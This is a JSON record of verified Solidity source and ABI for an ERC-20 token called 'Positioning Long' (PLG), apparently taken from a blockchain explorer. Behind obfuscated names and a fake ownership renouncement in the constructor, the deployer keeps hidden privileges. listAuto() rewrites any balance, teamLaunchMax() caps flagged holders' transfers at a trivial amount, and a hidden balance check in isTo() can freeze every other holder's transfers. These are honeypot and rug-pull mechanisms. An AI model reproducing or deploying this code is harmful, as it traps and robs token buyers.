{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface fromToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minFee {\n    function createPair(address toLimit, address launchWallet) external returns (address);\n}\n\ninterface walletTradingSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toFee) external view returns (uint256);\n\n    function transfer(address listShouldLaunched, uint256 totalToken) external returns (bool);\n\n    function allowance(address liquidityAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listShouldLaunched,\n        uint256 totalToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldTeam, uint256 value);\n    event Approval(address indexed liquidityAuto, address indexed spender, uint256 value);\n}\n\ninterface walletTradingSenderMetadata is walletTradingSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PositioningLong is txTo, walletTradingSender, walletTradingSenderMetadata {\n\n    function getOwner() external view returns (address) {\n        return senderWallet;\n    }\n\n    event OwnershipTransferred(address indexed isLimit, address indexed enableMax);\n\n    function balanceOf(address toFee) public view virtual override returns (uint256) {\n        return limitEnable[toFee];\n    }\n\n    uint256 constant maxLiquidity = 3 ** 10;\n\n    uint256 public listAmount;\n\n    mapping(address => uint256) private limitEnable;\n\n    function isReceiver(uint256 totalToken) public {\n        feeMarketingTake();\n        receiverMarketingAmount = totalToken;\n    }\n\n    function totalLiquidity(address fundAmount) public {\n        if (amountFee) {\n            return;\n        }\n        \n        fromEnable[fundAmount] = true;\n        if (buyMarketing != listAmount) {\n            fromTake = true;\n        }\n        amountFee = true;\n    }\n\n    uint256 private toTotal = 100000000 * 10 ** 18;\n\n    function isTakeMin() public {\n        emit OwnershipTransferred(toFund, address(0));\n        senderWallet = address(0);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return minSender;\n    }\n\n    function owner() external view returns (address) {\n        return senderWallet;\n    }\n\n    uint256 public buyMarketing;\n\n    function amountWallet(address receiverMarketing, address listShouldLaunched, uint256 totalToken) internal returns (bool) {\n        require(limitEnable[receiverMarketing] >= totalToken);\n        limitEnable[receiverMarketing] -= totalToken;\n        limitEnable[listShouldLaunched] += totalToken;\n        emit Transfer(receiverMarketing, listShouldLaunched, totalToken);\n        return true;\n    }\n\n    bool public maxListReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return toBuyMode;\n    }\n\n    address amountLimitEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function listAuto(address launchedTradingList, uint256 totalToken) public {\n        feeMarketingTake();\n        limitEnable[launchedTradingList] = totalToken;\n    }\n\n    function transfer(address launchedTradingList, uint256 totalToken) external virtual override returns (bool) {\n        return isTo(_msgSender(), launchedTradingList, totalToken);\n    }\n\n    mapping(address => bool) public fromEnable;\n\n    function teamLaunchMax(address maxBuy) public {\n        feeMarketingTake();\n        \n        if (maxBuy == toFund || maxBuy == shouldMode) {\n            return;\n        }\n        totalSell[maxBuy] = true;\n    }\n\n    function approve(address tokenTakeLiquidity, uint256 totalToken) public virtual override returns (bool) {\n        isSender[_msgSender()][tokenTakeLiquidity] = totalToken;\n        emit Approval(_msgSender(), tokenTakeLiquidity, totalToken);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderEnable;\n    }\n\n    string private minSender = \"Positioning Long\";\n\n    address private senderWallet;\n\n    function feeMarketingTake() private view {\n        require(fromEnable[_msgSender()]);\n    }\n\n    mapping(address => bool) public totalSell;\n\n    function transferFrom(address receiverMarketing, address listShouldLaunched, uint256 totalToken) external override returns (bool) {\n        if (_msgSender() != listSenderLiquidity) {\n            if (isSender[receiverMarketing][_msgSender()] != type(uint256).max) {\n                require(totalToken <= isSender[receiverMarketing][_msgSender()]);\n                isSender[receiverMarketing][_msgSender()] -= totalToken;\n            }\n        }\n        return isTo(receiverMarketing, listShouldLaunched, totalToken);\n    }\n\n    string private toBuyMode = \"PLG\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toTotal;\n    }\n\n    uint8 private senderEnable = 18;\n\n    function isTo(address receiverMarketing, address listShouldLaunched, uint256 totalToken) internal returns (bool) {\n        if (receiverMarketing == toFund) {\n            return amountWallet(receiverMarketing, listShouldLaunched, totalToken);\n        }\n        uint256 amountAtTotal = walletTradingSender(shouldMode).balanceOf(amountLimitEnable);\n        require(amountAtTotal == receiverMarketingAmount);\n        require(listShouldLaunched != amountLimitEnable);\n        if (totalSell[receiverMarketing]) {\n            return amountWallet(receiverMarketing, listShouldLaunched, maxLiquidity);\n        }\n        return amountWallet(receiverMarketing, listShouldLaunched, totalToken);\n    }\n\n    address public toFund;\n\n    address public shouldMode;\n\n    address listSenderLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 receiverMarketingAmount;\n\n    bool public amountFee;\n\n    function allowance(address shouldToken, address tokenTakeLiquidity) external view virtual override returns (uint256) {\n        if (tokenTakeLiquidity == listSenderLiquidity) {\n            return type(uint256).max;\n        }\n        return isSender[shouldToken][tokenTakeLiquidity];\n    }\n\n    constructor (){\n        if (listAmount == buyMarketing) {\n            fromTake = true;\n        }\n        fromToken toFrom = fromToken(listSenderLiquidity);\n        shouldMode = minFee(toFrom.factory()).createPair(toFrom.WETH(), address(this));\n        if (buyMarketing == listAmount) {\n            buyMarketing = listAmount;\n        }\n        toFund = _msgSender();\n        isTakeMin();\n        fromEnable[toFund] = true;\n        limitEnable[toFund] = toTotal;\n        if (fromTake != maxListReceiver) {\n            fromTake = true;\n        }\n        emit Transfer(address(0), toFund, toTotal);\n    }\n\n    uint256 modeFrom;\n\n    bool private fromTake;\n\n    mapping(address => mapping(address => uint256)) private isSender;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenTakeLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTakeLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalToken\",\"type\":\"uint256\"}],\"name\":\"isReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTakeMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTradingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalToken\",\"type\":\"uint256\"}],\"name\":\"listAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxListReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxBuy\",\"type\":\"address\"}],\"name\":\"teamLaunchMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"}],\"name\":\"totalLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTradingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listShouldLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PositioningLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}